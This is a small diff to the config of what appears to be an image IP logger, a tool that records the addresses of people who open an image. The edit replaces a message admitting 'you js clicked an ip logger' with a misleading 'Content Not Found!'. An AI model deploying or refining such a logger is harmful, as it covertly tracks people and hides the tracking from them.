@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "lmfao, you js clicked an ip logger", # Message to show
+        "message": "Content Not Found!", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
